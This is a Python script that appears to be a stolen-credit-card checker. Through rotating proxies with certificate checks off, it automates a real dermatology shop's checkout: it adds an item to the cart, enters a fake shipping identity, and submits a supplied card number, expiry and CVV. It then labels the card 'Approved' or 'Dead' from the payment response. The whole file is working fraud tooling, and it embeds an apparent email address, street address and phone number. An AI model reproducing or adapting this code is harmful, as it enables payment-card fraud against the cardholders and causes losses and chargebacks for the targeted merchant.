from utilsdf.functions import random_proxy, capture
from httpx import AsyncClient


async def lizzy(cc, month, year, cvv):
    proxy = random_proxy()
    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=proxy
    ) as session:
        r = await session.get(
            "https://www.helendaledermatology.com/shop/happy-vibes-rollerball",
        )
        r_ = r.text
        csrf = capture(r_, '"csrf-token" content="', '"')

        head2 = {
            "Host": "www.helendaledermatology.com",
            "x-csrf-token": f"{csrf}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "text/html, application/xhtml+xml",
            "origin": "https://www.helendaledermatology.com",
            "referer": "https://www.helendaledermatology.com/shop/happy-vibes-rollerball",
        }

        post2 = {
            "fingerprint": {
                "id": "pmJj8rtgIzWkedP8swPa",
                "name": "product.product-detail",
                "locale": "en",
                "path": "shop/happy-vibes-rollerball",
                "method": "GET",
                "v": "acj",
            },
            "serverMemo": {
                "children": [],
                "errors": [],
                "htmlHash": "01ff7d97",
                "data": {
                    "product": [],
                    "hasHiddenVariants": False,
                    "shoppingCartItem": {
                        "original_price": 8,
                        "formatted_original_price": "8.00",
                        "has_discount": False,
                        "price": 8,
                        "formatted_price": "8.00",
                        "sku": "",
                        "is_available": True,
                        "button_text": "Add To Cart",
                        "max_quantity": 2,
                        "quantity": 1,
                        "image": "https://media.cmsmax.com/o4mrf6dsp429hyaehstcs/happy-vibes-pulse-point-roller-ball-600x600.webp",
                    },
                    "variants": None,
                    "selectedVariant": None,
                    "attributes": [],
                    "selectedAttributes": [],
                    "hasOnDemandPrice": False,
                    "onDemandPriceValue": None,
                    "onDemandPriceInputName": None,
                    "selectedOptions": [],
                    "dimensionPrices": [],
                },
                "dataMeta": {
                    "models": {
                        "product": {
                            "class": "App\\Models\\Product",
                            "id": 278,
                            "relations": [
                                "url",
                                "socialMediaImage",
                                "thumbnailImage",
                                "brand",
                                "brand.url",
                                "productImages",
                            ],
                            "connection": "mysql",
                            "collectionClass": None,
                        }
                    },
                    "wireables": ["shoppingCartItem"],
                },
                "checksum": "e1122c53f07525d7a06cdc22d944abe7ecd1634ea5aeaa430a017b4004598ec4",
            },
            "updates": [
                {
                    "type": "callMethod",
                    "payload": {"id": "rqir", "method": "addToCart", "params": []},
                }
            ],
        }

        r2 = await session.post(
            "https://www.helendaledermatology.com/livewire/message/product.product-detail",
            headers=head2,
            json=post2,
        )

        head3 = {
            "Host": "www.helendaledermatology.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.helendaledermatology.com/shopping-cart",
        }

        r3 = await session.get(
            "https://www.helendaledermatology.com/checkout", headers=head3
        )

        head4 = {
            "Host": "www.helendaledermatology.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.helendaledermatology.com/checkout/fulfillment-method",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.helendaledermatology.com",
        }

        post4 = f"_token={csrf}&fulfillment_method=shipping"

        r4 = await session.post(
            "https://www.helendaledermatology.com/checkout/fulfillment-method",
            headers=head4,
            data=post4,
        )

        head5 = {
            "Host": "www.helendaledermatology.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.helendaledermatology.com/checkout/shipping-address",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.helendaledermatology.com",
        }

        post5 = f"_token={csrf}&email=sachiopremiun%40gmail.com&shipping_country=US&shipping_first_name=Sachio&shipping_last_name=YT&shipping_address_line_1=118+W+132nd+St&shipping_address_line_2=&shipping_city=New+York&shipping_state=NY&shipping_zip=10027&shipping_phone=%28190%29+063-1864&billing_same_as_shipping=1&billing_country=US&billing_first_name=&billing_last_name=&billing_address_line_1=&billing_address_line_2=&billing_city=&billing_state=&billing_zip=&billing_phone="

        r5 = await session.post(
            "https://www.helendaledermatology.com/checkout/shipping-address",
            headers=head5,
            data=post5,
        )

        head6 = {
            "Host": "www.helendaledermatology.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.helendaledermatology.com/checkout/shipping-method",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.helendaledermatology.com",
        }

        post6 = f"_token={csrf}&shipping_rate_attributes=%7B%22shipping_method_id%22%3A1%2C%22service%22%3Anull%2C%22price%22%3A11%2C%22name%22%3A%22Standard+Shipping+%287-10+days%29%22%7D"

        r6 = await session.post(
            "https://www.helendaledermatology.com/checkout/shipping-method",
            headers=head6,
            data=post6,
        )

        head7 = {
            "Host": "www.helendaledermatology.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.helendaledermatology.com/checkout/billing",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.helendaledermatology.com",
        }

        post7 = f"_token={csrf}&payment_method=credit_card&g-recaptcha-response=&card_number={cc}&card_exp_month={month}&card_exp_year={year}&card_cvv={cvv}"

        r7 = await session.post(
            "https://www.helendaledermatology.com/checkout/billing",
            headers=head7,
            data=post7,
        )

        head8 = {
            "Host": "www.helendaledermatology.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.helendaledermatology.com/checkout/review",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.helendaledermatology.com",
        }

        post8 = f"_token={csrf}&notes="

        r8 = await session.post(
            "https://www.helendaledermatology.com/checkout/submit",
            headers=head8,
            data=post8,
        )
        t8 = r8.text
        msg1 = capture(t8, '"alert alert-', '">')
        msg = capture(t8, f'"alert alert-{msg1}">', "</div>")

        if r8.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Thank You! -» $11"
        elif "Insufficient Funds" in msg:
            status = "Approved! ✅ -» low funds"
        elif "CVV2 verification failed" in msg:
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
